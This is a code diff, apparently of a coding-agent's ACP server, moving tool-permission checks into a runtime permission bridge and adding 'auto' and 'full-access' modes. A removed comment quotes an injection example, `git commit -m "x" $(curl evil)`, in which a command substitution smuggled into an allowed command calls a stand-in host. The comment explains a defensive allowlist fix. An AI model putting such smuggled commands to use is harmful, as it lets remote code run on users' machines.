@@ -52,27 +52,14 @@ import {
   type KodaXExtensionRuntime,
 } from '@kodax-ai/coding';
 import {
-  computeConfirmTools,
   FileSessionStorage,
   collectBashWriteTargets,
-  generateSavePattern,
-  getBashOutsideProjectWriteRisk,
-  getPlanModeBlockReason,
-  isAlwaysConfirmPath,
-  isBashReadCommand,
-  isPathInsideProject,
-  isToolCallAllowed,
   prepareRuntimeConfig,
   resolveRuntimeEffortSelection,
   resolveRuntimeModelSelection,
   resolveRuntimeProviderSelection,
   KODAX_CONFIG_FILE,
 } from '@kodax-ai/repl';
-import {
-  createBashPrefixExtractor,
-  resolveProvider,
-  type BashPrefixExtractor,
-} from '@kodax-ai/coding';
 import {
   AcpLogger,
   resolveAcpLogLevel,
@@ -84,32 +71,24 @@ import {
 } from './acp_events.js';
 import {
   createKodaXRuntime,
+  handleRuntimePermissionRequest,
   type KodaXRuntime,
+  type RuntimeEvent,
+  type RuntimePermissionGrantSuggestion,
+  type RuntimePermissionRequest,
   type RuntimeRunHandle,
   type RuntimeRunPhase,
 } from './sdk-runtime.js';
 
-/**
- * Permission mode ids exposed to ACP clients. These are wire-protocol values
- * advertised in `SessionMode.id`, so the set is intentionally narrower than
- * the canonical `PermissionMode` from `@kodax-ai/repl`.
- *
- * Why `'auto'` (canonical FEATURE_092 v0.7.33) is **not** here:
- *
- *   1. ACP's auto-mode classifier path requires an interactive `askUser`
- *      surface (the readline confirm prompt or Ink confirm dialog).
- *      `KodaXAcpServer` runs out-of-process and routes confirmations through
- *      `connection.requestPermission` — a different protocol that has no
- *      structural place for the classifier-escalate `<reason>` payload.
- *   2. ACP clients that want auto-style behavior continue to use the
- *      legacy alias `'auto-in-project'`, which goes through
- *      `evaluateToolPermission` → `requestPermissionFromClient` (no LLM
- *      classifier, identical pre-v0.7.33 semantics).
- *   3. Once an ACP-native classifier-escalate channel lands, `'auto'` will
- *      be added here as a third id without breaking existing clients.
- */
-export const ACP_PERMISSION_MODE_IDS = ['plan', 'accept-edits', 'auto-in-project'] as const;
+/** Canonical permission profile ids advertised on the ACP wire. */
+export const ACP_PERMISSION_MODE_IDS = [
+  'plan',
+  'accept-edits',
+  'auto',
+  'full-access',
+] as const;
 export type AcpPermissionMode = (typeof ACP_PERMISSION_MODE_IDS)[number];
+export type AcpPermissionModeInput = AcpPermissionMode | 'auto-in-project';
 
 // v0.7.42 — replaced the hardcoded `Set(['write', 'edit'])` with the
 // metadata-driven `isToolFileMutation` from `@kodax-ai/coding`. The old
@@ -141,13 +120,18 @@ const ACP_PERMISSION_MODE_DEFINITIONS: SessionMode[] = [
   },
   {
     id: 'accept-edits',
-    name: 'Accept Edits',
-    description: 'File edits are auto-approved. Shell commands still require confirmation unless explicitly remembered.',
+    name: 'Edits',
+    description: 'Uses the sandbox first and asks only at a real host boundary.',
   },
   {
-    id: 'auto-in-project',
-    name: 'Auto In Project',
-    description: 'Project-scoped changes are auto-approved. Protected paths and risky out-of-project operations still require confirmation.',
+    id: 'auto',
+    name: 'Auto[LLM]',
+    description: 'Uses the sandbox first and reviews only a real host-boundary operation.',
+  },
+  {
+    id: 'full-access',
+    name: 'Full Access',
+    description: 'Executes directly on the host, subject to Exec Policy and critical-effect denial.',
   },
 ];
 
@@ -168,7 +152,7 @@ export interface KodaXAcpServerOptions {
    * client-provided session cwd.
    */
   cwd?: string;
-  permissionMode?: AcpPermissionMode;
+  permissionMode?: AcpPermissionModeInput;
   logLevel?: AcpLogLevel;
   /** Additional sinks that receive structured ACP runtime events. */
   eventSinks?: AcpEventSink[];
@@ -187,7 +171,6 @@ interface KodaXAcpSessionState {
   cwd: string;
   permissionMode: AcpPermissionMode;
   mcpServers: McpServer[];
-  alwaysAllowTools: string[];
   activeRunIds: Set<string>;
   /** Created lazily on the first valid prompt so handshake-only sessions stay in memory. */
   runtimeSessionReady?: Promise<void>;
@@ -331,15 +314,24 @@ async function loadAcpExtensionGroups(
   await runtime.loadExtensions(configured, { continueOnError: true, loadSource: 'config' });
 }
 
-interface ToolPermissionDecision {
-  allowed: boolean;
-  override?: string;
+interface AcpRuntimePermissionBridge {
+  setRunId(runId: string): void;
+  close(): Promise<void>;
+}
+
+interface AcpPermissionDecision {
+  readonly allowed: boolean;
+  readonly override?: string;
+  readonly remember?: boolean;
 }
 
 function normalizeAcpPermissionMode(
   mode: string | undefined,
   fallback: AcpPermissionMode = 'accept-edits',
 ): AcpPermissionMode {
+  if (mode === 'auto-in-project') {
+    return 'auto';
+  }
   if (mode && ACP_PERMISSION_MODE_IDS.includes(mode as AcpPermissionMode)) {
     return mode as AcpPermissionMode;
   }
@@ -348,13 +340,16 @@ function normalizeAcpPermissionMode(
 }
 
 function parseSessionMode(mode: string | undefined): AcpPermissionMode {
+  if (mode === 'auto-in-project') {
+    return 'auto';
+  }
   if (mode && ACP_PERMISSION_MODE_IDS.includes(mode as AcpPermissionMode)) {
     return mode as AcpPermissionMode;
   }
 
   throw acpSdk().RequestError.invalidParams(
     { modeId: mode },
-    'Invalid session mode. Expected one of: plan, accept-edits, auto-in-project.',
+    'Invalid session mode. Expected one of: plan, accept-edits, auto, full-access.',
   );
 }
 
@@ -362,6 +357,75 @@ function buildModeState(currentModeId: AcpPermissionMode): SessionModeState {
   return {
     availableModes: ACP_PERMISSION_MODE_DEFINITIONS,
     currentModeId,
+  };
+}
+
+function parsePermissionInputPreview(value: string | undefined): Record<string, unknown> {
+  if (!value) return {};
+  try {
+    const parsed: unknown = JSON.parse(value);
+    return parsed !== null && typeof parsed === 'object' && !Array.isArray(parsed)
+      ? parsed as Record<string, unknown>
+      : { _inputPreview: value };
+  } catch {
+    return { _inputPreview: value };
+  }
+}
+
+function parsePermissionGrantSuggestions(
+  value: unknown,
+): RuntimePermissionGrantSuggestion[] {
+  if (!Array.isArray(value)) return [];
+  return value.flatMap((entry) => {
+    if (
+      entry === null ||
+      typeof entry !== 'object' ||
+      typeof (entry as { id?: unknown }).id !== 'string' ||
+      ((entry as { kind?: unknown }).kind !== 'session' &&
+        (entry as { kind?: unknown }).kind !== 'persistent') ||
+      typeof (entry as { label?: unknown }).label !== 'string'
+    ) {
+      return [];
+    }
+    const suggestion = entry as RuntimePermissionGrantSuggestion;
+    return [suggestion];
+  });
+}
+
+function runtimePermissionRequestFromEvent(
+  event: RuntimeEvent,
+): RuntimePermissionRequest | undefined {
+  if (event.type !== 'permission.requested') return undefined;
+  const payload = event.payload;
+  if (
+    payload === null ||
+    typeof payload !== 'object' ||
+    typeof (payload as { id?: unknown }).id !== 'string' ||
+    typeof (payload as { sessionId?: unknown }).sessionId !== 'string' ||
+    typeof (payload as { runId?: unknown }).runId !== 'string' ||
+    typeof (payload as { toolName?: unknown }).toolName !== 'string' ||
+    typeof (payload as { createdAt?: unknown }).createdAt !== 'string'
+  ) {
+    return undefined;
+  }
+  const input = payload as Record<string, unknown>;
+  const grantSuggestions = parsePermissionGrantSuggestions(input.grantSuggestions);
+  return {
+    id: input.id as string,
+    sessionId: input.sessionId as string,
+    runId: input.runId as string,
+    toolName: input.toolName as string,
+    createdAt: input.createdAt as string,
+    ...(typeof input.turnId === 'string' ? { turnId: input.turnId } : {}),
+    ...(typeof input.toolCallId === 'string' ? { toolCallId: input.toolCallId } : {}),
+    ...(typeof input.reason === 'string' ? { reason: input.reason } : {}),
+    ...(input.risk === 'low' || input.risk === 'medium' || input.risk === 'high'
+      ? { risk: input.risk }
+      : {}),
+    ...(typeof input.inputPreview === 'string' ? { inputPreview: input.inputPreview } : {}),
+    ...(typeof input.executionCwd === 'string' ? { executionCwd: input.executionCwd } : {}),
+    ...(grantSuggestions.length > 0 ? { grantSuggestions } : {}),
+    ...(typeof input.expiresAt === 'string' ? { expiresAt: input.expiresAt } : {}),
   };
 }
 
@@ -473,14 +537,6 @@ export class KodaXAcpServer implements Agent {
   private readonly ownsRuntime: boolean;
   private readonly logger: AcpLogger;
   private readonly events: AcpEventEmitter;
-  /**
-   * FEATURE_153 (v0.7.38) — LLM-backed bash prefix extractor used by
-   * `isToolCallAllowed` to match allowlist patterns against the extracted
-   * safe prefix instead of naive `command.startsWith`. Server-scoped (one
-   * per `KodaXAcpServer` instance) so the LRU cache is shared across all
-   * sessions, mirroring the REPL's session-scoped pattern.
-   */
-  private readonly bashPrefixExtractor: BashPrefixExtractor;
   private readonly configuredExtensions: string[];
   private readonly discoveredExtensions: Promise<string[]>;
 
@@ -557,14 +613,6 @@ export class KodaXAcpServer implements Agent {
         ...(options.eventSinks ?? []),
         logger,
       ],
-    });
-
-    // FEATURE_153 (v0.7.38): build the bash prefix extractor once at server
-    // construction. ACP sessions share the cache across the server lifetime
-    // (one server per process; the LRU cap of 200 keeps memory bounded).
-    this.bashPrefixExtractor = createBashPrefixExtractor({
-      getProvider: () => resolveProvider(this.provider),
-      getModel: () => this.model ?? '',
     });
 
     // Initialize extension runtime (non-blocking). Default/config extensions
@@ -710,7 +758,6 @@ export class KodaXAcpServer implements Agent {
       cwd: path.resolve(requestedCwd),
       permissionMode: this.defaultPermissionMode,
       mcpServers: clientMcpServers,
-      alwaysAllowTools: [],
       activeRunIds: new Set(),
     };
 
@@ -758,6 +805,13 @@ export class KodaXAcpServer implements Agent {
     const previousMode = session.permissionMode;
     const nextMode = parseSessionMode(params.modeId);
     session.permissionMode = nextMode;
+    if (session.runtimeSessionReady) {
+      await session.runtimeSessionReady;
+      const runtime = await this.runtimeReady;
+      await runtime.sessions.updateSettings(session.sessionId, {
+        permissionMode: nextMode,
+      });
+    }
     this.events.emit({
       type: 'session_mode_changed',
       sessionId: session.sessionId,
@@ -803,6 +857,7 @@ export class KodaXAcpServer implements Agent {
       });
 
       let handle: RuntimeRunHandle | undefined;
+      let permissionBridge: AcpRuntimePermissionBridge | undefined;
       try {
         // Ensure MCP is initialized before the first prompt.
         if (this.extensionRuntimeReady) {
@@ -810,11 +865,14 @@ export class KodaXAcpServer implements Agent {
         }
         const runtime = await this.runtimeReady;
         await this.ensureRuntimeSession(runtime, session, promptText);
+        permissionBridge = this.createRuntimePermissionBridge(runtime, session);
         handle = await runtime.runs.start({
           sessionId: session.sessionId,
           prompt: promptText,
+          permissionBroker: 'client',
           options: this.buildKodaXOptions(session, promptEffortOverride),
         });
+        permissionBridge?.setRunId(handle.runId);
         session.activeRunIds.add(handle.runId);
         const runtimeResult = await handle.result;
         if (runtimeResult.error) {
@@ -881,6 +939,7 @@ export class KodaXAcpServer implements Agent {
         if (handle) {
           session.activeRunIds.delete(handle.runId);
         }
+        await permissionBridge?.close();
       }
     };
 
@@ -899,7 +958,11 @@ export class KodaXAcpServer implements Agent {
         projectPath: session.cwd,
         gitRoot: session.cwd,
         surface: 'acp',
-      }).then(() => undefined);
+      }).then(async () => {
+        await runtime.sessions.updateSettings(session.sessionId, {
+          permissionMode: session.permissionMode,
+        });
+      });
     }
     try {
       await session.runtimeSessionReady;
@@ -1057,124 +1120,93 @@ export class KodaXAcpServer implements Agent {
             this.sendTextChunk(session.sessionId, `\n[Error] ${error.message}\n`),
           );
         },
-        beforeToolExecute: async (toolName, input, meta) => {
-          const decision = await this.evaluateToolPermission(session, toolName, input, meta?.toolId);
-          if (!decision.allowed) {
-            return decision.override ?? false;
-          }
-          return true;
-        },
       },
     };
   }
 
-  private async evaluateToolPermission(
+  private createRuntimePermissionBridge(
+    runtime: KodaXRuntime,
     session: KodaXAcpSessionState,
-    toolName: string,
-    input: Record<string, unknown>,
-    toolId?: string,
-  ): Promise<ToolPermissionDecision> {
+  ): AcpRuntimePermissionBridge {
+    const buffered: RuntimePermissionRequest[] = [];
+    let activeRunId: string | undefined;
+    let chain = Promise.resolve();
+    const enqueue = (request: RuntimePermissionRequest): void => {
+      chain = chain
+        .then(() => this.respondToRuntimePermission(runtime, session, request))
+        .catch((error: unknown) => {
+          this.logger.error(
+            `ACP Runtime permission bridge failed: ${
+              error instanceof Error ? error.message : String(error)
+            }`,
+          );
+        });
+    };
+    const subscription = runtime.events.subscribe(
+      { sessionId: session.sessionId, type: 'permission.requested' },
+      (event) => {
+        const request = runtimePermissionRequestFromEvent(event);
+        if (!request) return;
+        if (activeRunId === undefined) {
+          buffered.push(request);
+        } else if (request.runId === activeRunId) {
+          enqueue(request);
+        }
+      },
+    );
+    return {
+      setRunId(runId) {
+        activeRunId = runId;
+        for (const request of buffered.splice(0)) {
+          if (request.runId === runId) enqueue(request);
+        }
+      },
+      async close() {
+        subscription.close();
+        await chain;
+      },
+    };
+  }
+
+  private async respondToRuntimePermission(
+    runtime: KodaXRuntime,
+    session: KodaXAcpSessionState,
+    request: RuntimePermissionRequest,
+  ): Promise<void> {
     this.events.emit({
       type: 'tool_permission_evaluated',
       sessionId: session.sessionId,
-      tool: toolName,
-      toolId: toolId ?? null,
+      tool: request.toolName,
+      toolId: request.toolCallId ?? null,
       permissionMode: session.permissionMode,
     });
-    if (toolName === 'bash') {
-      const command = typeof input.command === 'string' ? input.command : '';
-      if (isBashReadCommand(command)) {
-        this.events.emit({
-          type: 'tool_permission_resolved',
-          sessionId: session.sessionId,
-          tool: toolName,
-          toolId: toolId ?? null,
-          outcome: 'auto_allowed_read_only_bash',
-        });
-        return { allowed: true };
-      }
-
-      // FEATURE_153 (v0.7.38): pass extractor so allowlist patterns match
-      // against the LLM-extracted safe prefix, closing the injection surface
-      // (`git commit -m "x" $(curl evil)` no longer matches `git commit:*`).
-      if (
-        await isToolCallAllowed(
-          toolName,
-          input,
-          session.alwaysAllowTools,
-          this.bashPrefixExtractor,
-        )
-      ) {
-        this.events.emit({
-          type: 'tool_permission_resolved',
-          sessionId: session.sessionId,
-          tool: toolName,
-          toolId: toolId ?? null,
-          outcome: 'auto_allowed_remembered',
-        });
-        return { allowed: true };
-      }
-    }
-
-    if (session.permissionMode === 'plan') {
-      const blockReason = getPlanModeBlockReason(toolName, input, session.cwd);
-      if (blockReason) {
-        this.events.emit({
-          type: 'tool_permission_resolved',
-          sessionId: session.sessionId,
-          tool: toolName,
-          toolId: toolId ?? null,
-          outcome: 'blocked_plan_mode',
-        });
+    await handleRuntimePermissionRequest(runtime, request, async () => {
+      const decision = await this.requestPermissionFromClient(
+        session,
+        request.toolName,
+        parsePermissionInputPreview(request.inputPreview),
+        request.toolCallId,
+      );
+      if (!decision.allowed) {
         return {
-          allowed: false,
-          override: `${blockReason} Do not try to modify files while planning. Finish the plan first, then hand off to a writable mode.`,
+          type: 'reject',
+          reason: decision.override ?? 'Operation cancelled by user.',
         };
       }
-      this.events.emit({
-        type: 'tool_permission_resolved',
-        sessionId: session.sessionId,
-        tool: toolName,
-        toolId: toolId ?? null,
-        outcome: 'auto_allowed_plan_mode',
-      });
-      return { allowed: true };
-    }
-
-    const needsProtectedPathConfirmation =
-      acpIsFileModificationTool(toolName) &&
-      typeof input.path === 'string' &&
-      isAlwaysConfirmPath(path.resolve(session.cwd, input.path), session.cwd);
-
-    const needsModeConfirmation = computeConfirmTools(session.permissionMode).has(toolName);
-    const needsAutoOutsideProjectConfirmation =
-      session.permissionMode === 'auto-in-project' &&
-      (
-        (acpIsFileModificationTool(toolName) &&
-          typeof input.path === 'string' &&
-          !isPathInsideProject(input.path, session.cwd)) ||
-        (toolName === 'bash' &&
-          typeof input.command === 'string' &&
-          getBashOutsideProjectWriteRisk(input.command, session.cwd).dangerous)
-      );
-
-    if (
-      !needsProtectedPathConfirmation &&
-      !needsModeConfirmation &&
-      !needsAutoOutsideProjectConfirmation
-    ) {
-      this.events.emit({
-        type: 'tool_permission_resolved',
-        sessionId: session.sessionId,
-        tool: toolName,
-        toolId: toolId ?? null,
-        outcome: 'auto_allowed_policy',
-      });
-      return { allowed: true };
-    }
-
-    const permissionResult = await this.requestPermissionFromClient(session, toolName, input, toolId);
-    return permissionResult;
+      if (decision.remember) {
+        const suggestion = request.grantSuggestions?.find(
+          (candidate) => candidate.kind === 'persistent',
+        ) ?? request.grantSuggestions?.find(
+          (candidate) => candidate.kind === 'session',
+        );
+        if (suggestion) {
+          return suggestion.kind === 'persistent'
+            ? { type: 'allow_always', suggestionId: suggestion.id }
+            : { type: 'allow_session', suggestionId: suggestion.id };
+        }
+      }
+      return { type: 'allow_once' };
+    });
   }
 
   private async requestPermissionFromClient(
@@ -1182,7 +1214,7 @@ export class KodaXAcpServer implements Agent {
     toolName: string,
     input: Record<string, unknown>,
     toolId?: string,
-  ): Promise<ToolPermissionDecision> {
+  ): Promise<AcpPermissionDecision> {
     if (!this.connection) {
       this.events.emit({
         type: 'tool_permission_resolved',
@@ -1266,17 +1298,6 @@ export class KodaXAcpServer implements Agent {
       };
     }
 
-    if (response.outcome.optionId === 'allow_always') {
-      if (toolName === 'bash') {
-        session.alwaysAllowTools = Array.from(
-          new Set([
-            ...session.alwaysAllowTools,
-            generateSavePattern(toolName, input, false),
-          ]),
-        ).filter(Boolean);
-      }
-    }
-
     if (response.outcome.optionId === 'reject_once') {
       this.events.emit({
         type: 'tool_permission_resolved',
@@ -1299,7 +1320,10 @@ export class KodaXAcpServer implements Agent {
       outcome: 'request_granted',
       remember: response.outcome.optionId === 'allow_always',
     });
-    return { allowed: true };
+    return {
+      allowed: true,
+      ...(response.outcome.optionId === 'allow_always' ? { remember: true } : {}),
+    };
   }
 
   private async sendTextChunk(sessionId: string, text: string): Promise<void> {
